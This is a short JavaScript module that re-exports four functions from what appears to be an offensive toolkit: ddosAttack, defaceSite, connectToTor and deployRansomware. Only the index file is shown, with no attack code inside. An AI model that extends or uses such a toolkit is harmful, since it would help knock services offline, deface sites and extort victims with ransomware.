const ddos = require('./ddos/ddos');
const deface = require('./deface/deface');
const tor = require('./tor/tor');
const ransomware = require('./ransomware/ransomware');

module.exports = {
    ddosAttack: ddos.ddosAttack,
    defaceSite: deface.defaceSite,
    connectToTor: tor.connectToTor,
    deployRansomware: ransomware.deployRansomware
};